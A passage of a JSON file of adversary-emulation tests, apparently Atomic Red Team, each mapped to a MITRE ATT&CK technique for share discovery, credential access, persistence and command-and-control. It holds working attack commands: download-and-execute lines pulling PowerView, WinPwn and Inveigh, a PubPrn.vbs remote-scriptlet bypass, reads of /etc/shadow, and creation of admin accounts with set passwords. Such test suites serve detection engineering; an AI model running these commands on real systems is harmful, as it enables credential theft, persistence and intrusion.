			"command": "sudo smbstatus --shares\n",
			"name": "bash",
			"elevation_required": true
		},
		"attack_technique": "T1135",
		"phases": ["discovery"]
	},
	{
		"name": "Network Share Discovery - FreeBSD",
		"auto_generated_guid": "77e468a6-3e5c-45a1-9948-c4b5603747cb",
		"supported_platforms": ["linux"],
		"input_arguments": {
			"package_checker": {
				"description": "Package checking command. pkg info -x samba",
				"type": "string",
				"default": "(pkg info -x samba &>/dev/null)"
			},
			"package_installer": {
				"description": "Package installer command. pkg install -y samba413",
				"type": "string",
				"default": "(which pkg && pkg install -y samba413)"
			}
		},
		"dependency_executor_name": "sh",
		"dependencies": [
			{
				"description": "Package with smbstatus (samba) must exist on device\n",
				"prereq_command": "if #{package_checker} > /dev/null; then exit 0; else exit 1; fi\n",
				"get_prereq_command": "#{package_installer} \n"
			}
		],
		"executor": {
			"command": "smbstatus --shares\n",
			"name": "sh",
			"elevation_required": true
		},
		"attack_technique": "T1135",
		"phases": ["discovery"]
	},
	{
		"name": "Network Share Discovery command prompt",
		"auto_generated_guid": "20f1097d-81c1-405c-8380-32174d493bbb",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"computer_name": {
				"description": "Computer name to find a mount on.",
				"type": "string",
				"default": "localhost"
			}
		},
		"executor": {
			"command": "net view \\\\#{computer_name}\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1135",
		"phases": ["discovery"]
	},
	{
		"name": "Network Share Discovery PowerShell",
		"auto_generated_guid": "1b0814d1-bb24-402d-9615-1b20c50733fb",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "get-smbshare\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1135",
		"phases": ["discovery"]
	},
	{
		"name": "View available share drives",
		"auto_generated_guid": "ab39a04f-0c93-4540-9ff2-83f862c385ae",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "net share\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1135",
		"phases": ["discovery"]
	},
	{
		"name": "Share Discovery with PowerView",
		"auto_generated_guid": "b1636f0a-ba82-435c-b699-0d78794d8bfd",
		"supported_platforms": ["windows"],
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "Endpoint must be joined to domain\n",
				"prereq_command": "if ((Get-WmiObject -Class Win32_ComputerSystem).PartofDomain) {exit 0} else {exit 1}\n",
				"get_prereq_command": "\"Join system to domain\"\n"
			}
		],
		"executor": {
			"command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Find-DomainShare -CheckShareAccess -Verbose\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1135",
		"phases": ["discovery"]
	},
	{
		"name": "PowerView ShareFinder",
		"auto_generated_guid": "d07e4cc1-98ae-447e-9d31-36cb430d28c4",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"parameters": {
				"description": "ShareFinder parameter",
				"type": "string",
				"default": "-CheckShareAccess"
			}
		},
		"dependencies": [
			{
				"description": "Invoke-ShareFinder module must exist in %TEMP% directory",
				"prereq_command": "if (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\PowerView.ps1\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://raw.githubusercontent.com/darkoperator/Veil-PowerView/8784e33f17ee7543ba2f45e27dc5f08ea3a1b856/PowerView/powerview.ps1\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\PowerView.ps1\"\n"
			}
		],
		"executor": {
			"command": "Import-Module \"PathToAtomicsFolder\\..\\ExternalPayloads\\PowerView.ps1\"\nInvoke-ShareFinder #{parameters}\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1135",
		"phases": ["discovery"]
	},
	{
		"name": "WinPwn - shareenumeration",
		"auto_generated_guid": "987901d1-5b87-4558-a6d9-cffcabc638b8",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nshareenumeration -noninteractive -consoleoutput",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1135",
		"phases": ["discovery"]
	},
	{
		"name": "Network Share Discovery via dir command",
		"auto_generated_guid": "13daa2cf-195a-43df-a8bd-7dd5ffb607b5",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"computer_ip": {
				"description": "Computer IP to find a mount on.",
				"type": "string",
				"default": "127.0.0.1"
			}
		},
		"executor": {
			"command": "dir \\\\#{computer_ip}\\c$\ndir \\\\#{computer_ip}\\admin$\ndir \\\\#{computer_ip}\\IPC$\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1135",
		"phases": ["discovery"]
	},
	{
		"name": "Enumerate All Network Shares with SharpShares",
		"auto_generated_guid": "d1fa2a69-b0a2-4e8a-9112-529b00c19a41",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"output_path": {
				"description": "File to output enumeration results to",
				"type": "String",
				"default": "$env:temp\\T1135SharpSharesOutput.txt"
			},
			"sharp_path": {
				"description": "Path to the SharpShares executable",
				"type": "String",
				"default": "PathToAtomicsFolder\\..\\ExternalPayloads\\SharpShares.exe"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "The SharpShares executable must exist on disk",
				"prereq_command": "if (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\SharpShares.exe\") {exit 0} else {exit 1}",
				"get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://github.com/mitchmoser/SharpShares/releases/download/v2.4/SharpShares.exe\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\SharpShares.exe\""
			}
		],
		"executor": {
			"command": "cmd /c '#{sharp_path}' /ldap:all | out-file -filepath \"#{output_path}\"",
			"cleanup_command": "remove-item \"#{output_path}\" -force -erroraction silentlycontinue",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1135",
		"phases": ["discovery"]
	},
	{
		"name": "Enumerate All Network Shares with Snaffler",
		"auto_generated_guid": "b19d74b7-5e72-450a-8499-82e49e379d1a",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"output_path": {
				"description": "File to output enumeration results to",
				"type": "String",
				"default": "$env:temp\\T1135SnafflerOutput.txt"
			},
			"snaffler_path": {
				"description": "Path to the Snaffler executable",
				"type": "String",
				"default": "PathToAtomicsFolder\\..\\ExternalPayloads\\Snaffler.exe"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "The Snaffler executable must exist on disk",
				"prereq_command": "if (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\Snaffler.exe\") {exit 0} else {exit 1}",
				"get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://github.com/SnaffCon/Snaffler/releases/download/1.0.150/Snaffler.exe\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\Snaffler.exe\""
			}
		],
		"executor": {
			"command": "invoke-expression 'cmd /c start powershell -command { cmd /c \"#{snaffler_path}\" -a -o \"#{output_path}\" }; start-sleep 90; stop-process -name \"snaffler\"'\n",
			"cleanup_command": "remove-item \"#{output_path}\" -force -erroraction silentlycontinue",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1135",
		"phases": ["discovery"]
	},
	{
		"name": "Download Macro-Enabled Phishing Attachment",
		"auto_generated_guid": "114ccff9-ae6d-4547-9ead-4cd69f687306",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "$url = 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1566.001/bin/PhishingAttachment.xlsm'\n[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nInvoke-WebRequest -Uri $url -OutFile $env:TEMP\\PhishingAttachment.xlsm\n",
			"name": "powershell",
			"cleanup_command": "Remove-Item $env:TEMP\\PhishingAttachment.xlsm -ErrorAction Ignore\n",
			"elevation_required": false
		},
		"attack_technique": "T1566.001",
		"phases": ["initial-access"]
	},
	{
		"name": "Word spawned a command shell and used an IP address in the command line",
		"auto_generated_guid": "cbb6799a-425c-4f83-9194-5447a909d67f",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"jse_path": {
				"description": "Path for the macro to write out the \"malicious\" .jse file\n",
				"type": "string",
				"default": "C:\\Users\\Public\\art.jse"
			},
			"ms_product": {
				"description": "Maldoc application Word or Excel",
				"type": "string",
				"default": "Word"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "Microsoft #{ms_product} must be installed\n",
				"prereq_command": "try {\n  New-Object -COMObject \"#{ms_product}.Application\" | Out-Null\n  $process = \"#{ms_product}\"; if ( $process -eq \"Word\") {$process = \"winword\"}\n  Stop-Process -Name $process\n  exit 0\n} catch { exit 1 }\n",
				"get_prereq_command": "Write-Host \"You will need to install Microsoft #{ms_product} manually to meet this requirement\"\n"
			}
		],
		"executor": {
			"command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing)\n$macrocode = \"   Open `\"#{jse_path}`\" For Output As #1`n   Write #1, `\"WScript.Quit`\"`n   Close #1`n   Shell`$ `\"ping 8.8.8.8`\"`n\"\nInvoke-MalDoc -macroCode $macrocode -officeProduct \"#{ms_product}\"\n",
			"cleanup_command": "Remove-Item #{jse_path} -ErrorAction Ignore\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1566.001",
		"phases": ["initial-access"]
	},
	{
		"name": "Compress Data for Exfiltration With PowerShell",
		"auto_generated_guid": "41410c60-614d-4b9d-b66e-b0192dd9c597",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"input_file": {
				"description": "Path that should be compressed into our output file",
				"type": "path",
				"default": "$env:USERPROFILE"
			},
			"output_file": {
				"description": "Path where resulting compressed data should be placed",
				"type": "path",
				"default": "$env:USERPROFILE\\T1560-data-ps.zip"
			}
		},
		"executor": {
			"name": "powershell",
			"elevation_required": false,
			"command": "dir #{input_file} -Recurse | Compress-Archive -DestinationPath #{output_file}\n",
			"cleanup_command": "Remove-Item -path #{output_file} -ErrorAction Ignore"
		},
		"attack_technique": "T1560",
		"phases": ["collection"]
	},
	{
		"name": "Detect a Debugger Presence in the Machine",
		"auto_generated_guid": "58bd8c8d-3a1a-4467-a69c-439c75469b07",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "# Check for common debugger processes\n$debuggerProcesses = Get-Process | Where-Object { $_.ProcessName -match \"dbg\" -or $_.ProcessName -match \"debug\" }\n# Check for debugging flags\n$debuggingFlags = [System.Diagnostics.Debugger]::IsAttached ",
			"name": "powershell",
			"elevation_required": true
		},
		"attack_technique": "T1622",
		"phases": ["defense-evasion", "discovery"]
	},
	{
		"name": "Access /etc/shadow (Local)",
		"auto_generated_guid": "3723ab77-c546-403c-8fb4-bb577033b235",
		"supported_platforms": ["linux"],
		"input_arguments": {
			"output_file": {
				"description": "Path where captured results will be placed",
				"type": "path",
				"default": "/tmp/T1003.008.txt"
			}
		},
		"executor": {
			"command": "sudo cat /etc/shadow > #{output_file}\ncat #{output_file}\n",
			"cleanup_command": "rm -f #{output_file}\n",
			"name": "bash",
			"elevation_required": true
		},
		"attack_technique": "T1003.008",
		"phases": ["credential-access"]
	},
	{
		"name": "Access /etc/master.passwd (Local)",
		"auto_generated_guid": "5076874f-a8e6-4077-8ace-9e5ab54114a5",
		"supported_platforms": ["linux"],
		"input_arguments": {
			"output_file": {
				"description": "Path where captured results will be placed",
				"type": "path",
				"default": "/tmp/T1003.008.txt"
			}
		},
		"executor": {
			"command": "sudo cat /etc/master.passwd > #{output_file}\ncat #{output_file}\n",
			"cleanup_command": "rm -f #{output_file}\n",
			"name": "sh",
			"elevation_required": true
		},
		"attack_technique": "T1003.008",
		"phases": ["credential-access"]
	},
	{
		"name": "Access /etc/passwd (Local)",
		"auto_generated_guid": "60e860b6-8ae6-49db-ad07-5e73edd88f5d",
		"supported_platforms": ["linux"],
		"input_arguments": {
			"output_file": {
				"description": "Path where captured results will be placed",
				"type": "path",
				"default": "/tmp/T1003.008.txt"
			}
		},
		"executor": {
			"command": "cat /etc/passwd > #{output_file}\ncat #{output_file}\n",
			"cleanup_command": "rm -f #{output_file}\n",
			"name": "sh",
			"elevation_required": false
		},
		"attack_technique": "T1003.008",
		"phases": ["credential-access"]
	},
	{
		"name": "Access /etc/{shadow,passwd,master.passwd} with a standard bin that's not cat",
		"auto_generated_guid": "df1a55ae-019d-4120-bc35-94f4bc5c4b0a",
		"supported_platforms": ["linux"],
		"input_arguments": {
			"output_file": {
				"description": "Path where captured results will be placed",
				"type": "path",
				"default": "/tmp/T1003.008.txt"
			}
		},
		"executor": {
			"command": "unamestr=$(uname)\nif [ \"$unamestr\" = 'Linux' ]; then echo -e \"e /etc/passwd\\n,p\\ne /etc/shadow\\n,p\\n\" | ed > ${output_file}; elif [ \"$unamestr\" = 'FreeBSD' ]; then echo -e \"e /etc/passwd\\n,p\\ne /etc/master.passwd\\n,p\\ne /etc/shadow\\n,p\\n\" | ed > ${output_file}; fi\n",
			"cleanup_command": "rm -f #{output_file}\n",
			"name": "sh",
			"elevation_required": true
		},
		"attack_technique": "T1003.008",
		"phases": ["credential-access"]
	},
	{
		"name": "Access /etc/{shadow,passwd,master.passwd} with shell builtins",
		"auto_generated_guid": "f5aa6543-6cb2-4fae-b9c2-b96e14721713",
		"supported_platforms": ["linux"],
		"input_arguments": {
			"output_file": {
				"description": "Path where captured results will be placed",
				"type": "path",
				"default": "/tmp/T1003.008.txt"
			}
		},
		"executor": {
			"command": "testcat(){ (while read line; do echo $line >> #{output_file}; done < $1) }\n[ \"$(uname)\" = 'FreeBSD' ] && testcat /etc/master.passwd\ntestcat /etc/passwd\ntestcat /etc/shadow\n",
			"cleanup_command": "rm -f #{output_file}\n",
			"name": "sh",
			"elevation_required": true
		},
		"attack_technique": "T1003.008",
		"phases": ["credential-access"]
	},
	{
		"name": "PubPrn.vbs Signed Script Bypass",
		"auto_generated_guid": "9dd29a1f-1e16-4862-be83-913b10a88f6c",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"remote_payload": {
				"description": "A remote payload to execute using PubPrn.vbs.",
				"type": "url",
				"default": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1216.001/src/T1216.001.sct"
			}
		},
		"executor": {
			"command": "cscript.exe /b C:\\Windows\\System32\\Printing_Admin_Scripts\\en-US\\pubprn.vbs localhost \"script:#{remote_payload}\"\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1216.001",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Query Registry",
		"auto_generated_guid": "8f7578c4-9863-4d83-875c-a565573bbdf0",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows\"\nreg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce\nreg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce\nreg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices\nreg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices\nreg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify\"\nreg query \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit\"\nreg query \"HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\\Shell\"\nreg query \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\\Shell\"\nreg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\ShellServiceObjectDelayLoad\nreg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\nreg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\nreg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\nreg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\nreg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\nreg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\nreg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\nreg query HKLM\\system\\currentcontrolset\\services /s | findstr ImagePath 2>nul | findstr /Ri \".*\\.sys$\"\nreg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\nreg query HKLM\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\nreg query \"HKLM\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\"\nreg query \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Group Policy\\Scripts\\Startup\"\n",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1012",
		"phases": ["discovery"]
	},
	{
		"name": "Query Registry with Powershell cmdlets",
		"auto_generated_guid": "0434d081-bb32-42ce-bcbb-3548e4f2628f",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "Get-Item -Path \"HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows\"\nGet-ChildItem -Path \"HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\\" | findstr Windows\nGet-Item -Path \"HKLM:Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce\"\nGet-Item -Path \"HKCU:Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce\"\nGet-Item -Path \"HKLM:Software\\Microsoft\\Windows\\CurrentVersion\\RunServices\"\nGet-Item -Path \"HKCU:Software\\Microsoft\\Windows\\CurrentVersion\\RunServices\"\nGet-Item -Path \"HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify\"\nGet-Item -Path \"HKLM:Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit\"\nGet-Item -Path \"HKCU:Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\\Shell\"\nGet-Item -Path \"HKLM:Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\\Shell\"\nGet-Item -Path \"HKLM:SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\ShellServiceObjectDelayLoad\"\nGet-Item -Path \"HKLM:Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\"\nGet-Item -Path \"HKLM:Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\"\nGet-Item -Path \"HKLM:Software\\Microsoft\\Windows\\CurrentVersion\\Run\"\nGet-Item -Path \"HKCU:Software\\Microsoft\\Windows\\CurrentVersion\\Run\"\nGet-Item -Path \"HKCU:Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\"\nGet-Item -Path \"HKLM:Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\"\nGet-Item -Path \"HKCU:Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\"\nGet-ChildItem -Path \"HKLM:system\\currentcontrolset\\services\" \nGet-Item -Path \"HKLM:Software\\Microsoft\\Windows\\CurrentVersion\\Run\"\nGet-Item -Path \"HKLM:SYSTEM\\CurrentControlSet\\Control\\SafeBoot\"\nGet-ChildItem -Path \"HKLM:SOFTWARE\\Microsoft\\Active Setup\\Installed Components\"\nGet-ChildItem -Path \"HKLM:SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Group Policy\\Scripts\\Startup\"\n",
			"name": "powershell",
			"elevation_required": true
		},
		"attack_technique": "T1012",
		"phases": ["discovery"]
	},
	{
		"name": "Enumerate COM Objects in Registry with Powershell",
		"auto_generated_guid": "0d80d088-a84c-4353-af1a-fc8b439f1564",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"output_file": {
				"description": "File to output list of COM objects to",
				"type": "string",
				"default": "$env:temp\\T1592.002Test1.txt"
			}
		},
		"executor": {
			"command": "New-PSDrive -PSProvider registry -Root HKEY_CLASSES_ROOT -Name HKCR\nGet-ChildItem -Path HKCR:\\CLSID -Name | Select -Skip 1 > $env:temp\\clsids.txt\nForEach($CLSID in Get-Content \"$env:temp\\clsids.txt\")\n{try{write-output \"$($Position)-$($CLSID)\"\nwrite-output \"------------\"| out-file #{output_file} -append\nwrite-output $($CLSID)| out-file #{output_file} -append\n$handle=[activator]::CreateInstance([type]::GetTypeFromCLSID($CLSID))\n$handle | get-member -erroraction silentlycontinue | out-file #{output_file} -append\n$position += 1} catch{}}\n",
			"cleanup_command": "remove-item #{output_file} -force -erroraction silentlycontinue\nremove-item $env:temp\\clsids.txt -force -erroraction silentlycontinue      \n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1012",
		"phases": ["discovery"]
	},
	{
		"name": "Reg query for AlwaysInstallElevated status",
		"auto_generated_guid": "6fb4c4c5-f949-4fd2-8af5-ddbc61595223",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\nreg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated      \n",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1012",
		"phases": ["discovery"]
	},
	{
		"name": "Malicious User Agents - Powershell",
		"auto_generated_guid": "81c13829-f6c9-45b8-85a6-053366d55297",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"domain": {
				"description": "Default domain to simulate against",
				"type": "string",
				"default": "www.google.com"
			}
		},
		"executor": {
			"command": "Invoke-WebRequest #{domain} -UserAgent \"HttpBrowser/1.0\" | out-null\nInvoke-WebRequest #{domain} -UserAgent \"Wget/1.9+cvs-stable (Red Hat modified)\" | out-null\nInvoke-WebRequest #{domain} -UserAgent \"Opera/8.81 (Windows NT 6.0; U; en)\" | out-null\nInvoke-WebRequest #{domain} -UserAgent \"*<|>*\" | out-null\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1071.001",
		"phases": ["command-and-control"]
	},
	{
		"name": "Malicious User Agents - CMD",
		"auto_generated_guid": "dc3488b0-08c7-4fea-b585-905c83b48180",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"domain": {
				"description": "Default domain to simulate against",
				"type": "string",
				"default": "www.google.com"
			},
			"curl_path": {
				"description": "path to curl.exe",
				"type": "path",
				"default": "C:\\Windows\\System32\\Curl.exe"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "Curl must be installed on system \n",
				"prereq_command": "if (Test-Path #{curl_path}) {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://curl.se/windows/dl-8.6.0_2/curl-8.6.0_2-win32-mingw.zip\" -Outfile \"PathToAtomicsFolder\\..\\ExternalPayloads\\curl.zip\"\nExpand-Archive -Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\curl.zip\" -DestinationPath \"PathToAtomicsFolder\\..\\ExternalPayloads\\curl\"\nCopy-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\curl\\curl-8.6.0_2-win32-mingw\\bin\\curl.exe\" #{curl_path}\nRemove-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\curl\"\nRemove-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\curl.zip\"\n"
			}
		],
		"executor": {
			"command": "#{curl_path} -s -A \"HttpBrowser/1.0\" -m3 #{domain} >nul 2>&1\n#{curl_path} -s -A \"Wget/1.9+cvs-stable (Red Hat modified)\" -m3 #{domain} >nul 2>&1\n#{curl_path} -s -A \"Opera/8.81 (Windows NT 6.0; U; en)\" -m3 #{domain} >nul 2>&1\n#{curl_path} -s -A \"*<|>*\" -m3 #{domain} >nul 2>&1\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1071.001",
		"phases": ["command-and-control"]
	},
	{
		"name": "Malicious User Agents - Nix",
		"auto_generated_guid": "2d7c471a-e887-4b78-b0dc-b0df1f2e0658",
		"supported_platforms": ["linux", "macos"],
		"input_arguments": {
			"domain": {
				"description": "Default domain to simulate against",
				"type": "string",
				"default": "www.google.com"
			}
		},
		"executor": {
			"command": "curl -s -A \"HttpBrowser/1.0\" -m3 #{domain}\ncurl -s -A \"Wget/1.9+cvs-stable (Red Hat modified)\" -m3 #{domain}\ncurl -s -A \"Opera/8.81 (Windows NT 6.0; U; en)\" -m3 #{domain}\ncurl -s -A \"*<|>*\" -m3 #{domain}\n",
			"name": "sh",
			"elevation_required": false
		},
		"attack_technique": "T1071.001",
		"phases": ["command-and-control"]
	},
	{
		"name": "LLMNR Poisoning with Inveigh (PowerShell)",
		"auto_generated_guid": "deecd55f-afe0-4a62-9fba-4d1ba2deb321",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/82be2377ade47a4e325217b4144878a59595e750/Inveigh.ps1\" -UseBasicParsing)\nInvoke-Inveigh -ConsoleOutput Y -NBNS Y -MDNS Y -HTTPS Y -PROXY Y",
			"name": "powershell",
			"elevation_required": true
		},
		"attack_technique": "T1557.001",
		"phases": ["collection", "credential-access"]
	},
	{
		"name": "Create local account with admin privileges",
		"auto_generated_guid": "a524ce99-86de-4db6-b4f9-e08f35a47a15",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"password": {
				"description": "Password for art-test user",
				"type": "string",
				"default": "-4RTisCool!-321"
			}
		},
		"executor": {
			"command": "net user art-test /add\nnet user art-test #{password}\nnet localgroup administrators art-test /add",
			"cleanup_command": "net localgroup administrators art-test /delete >nul 2>&1\nnet user art-test /delete >nul 2>&1",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1078.003",
		"phases": [
			"defense-evasion",
			"initial-access",
			"persistence",
			"privilege-escalation"
		]
	},
	{
		"name": "Create local account with admin privileges - MacOS",
		"auto_generated_guid": "f1275566-1c26-4b66-83e3-7f9f7f964daa",
		"supported_platforms": ["macos"],
		"executor": {
			"command": "dscl . -create /Users/AtomicUser\ndscl . -create /Users/AtomicUser UserShell /bin/bash\ndscl . -create /Users/AtomicUser RealName \"Atomic User\"\ndscl . -create /Users/AtomicUser UniqueID 503\ndscl . -create /Users/AtomicUser PrimaryGroupID 503\ndscl . -create /Users/AtomicUser NFSHomeDirectory /Local/Users/AtomicUser\ndscl . -passwd /Users/AtomicUser mySecretPassword\ndscl . -append /Groups/admin GroupMembership AtomicUser",
			"cleanup_command": "sudo dscl . -delete /Users/AtomicUser",
			"name": "bash",
			"elevation_required": true
		},
		"attack_technique": "T1078.003",
		"phases": [
			"defense-evasion",
			"initial-access",
			"persistence",
			"privilege-escalation"
		]
	},
	{
		"name": "Create local account with admin privileges using sysadminctl utility - MacOS",
		"auto_generated_guid": "191db57d-091a-47d5-99f3-97fde53de505",
		"supported_platforms": ["macos"],
		"executor": {
			"command": "sysadminctl interactive -addUser art-tester -fullName ARTUser -password !pass123! -admin",
			"cleanup_command": "sysadminctl interactive -deleteUser art-tester",
			"name": "bash",
			"elevation_required": true
		},
		"attack_technique": "T1078.003",
		"phases": [
			"defense-evasion",
			"initial-access",
			"persistence",
			"privilege-escalation"
		]
	},
	{
		"name": "Enable root account using dsenableroot utility - MacOS",
		"auto_generated_guid": "20b40ea9-0e17-4155-b8e6-244911a678ac",
		"supported_platforms": ["macos"],
		"executor": {
			"command": "dsenableroot #current user\ndsenableroot -u art-tester -p art-tester -r art-root #new user",
			"cleanup_command": "dsenableroot -d #current user\ndsenableroot -d -u art-tester -p art-tester #new user",
			"name": "bash",
			"elevation_required": true
		},
		"attack_technique": "T1078.003",
		"phases": [
			"defense-evasion",
			"initial-access",
			"persistence",
			"privilege-escalation"
		]
	},
	{
		"name": "Add a new/existing user to the admin group using dseditgroup utility - macOS",
		"auto_generated_guid": "433842ba-e796-4fd5-a14f-95d3a1970875",
		"supported_platforms": ["macos"],
		"executor": {
			"command": "dseditgroup -o edit -a art-user -t user admin",
			"cleanup_command": "dseditgroup -o edit -d art-user -t user admin",
			"name": "bash",
			"elevation_required": true
		},
		"attack_technique": "T1078.003",
		"phases": [
			"defense-evasion",
			"initial-access",
			"persistence",
			"privilege-escalation"
		]
	},
	{
		"name": "WinPwn - Loot local Credentials - powerhell kittie",
		"auto_generated_guid": "9e9fd066-453d-442f-88c1-ad7911d32912",
		"supported_platforms": ["windows"],
		"executor": {
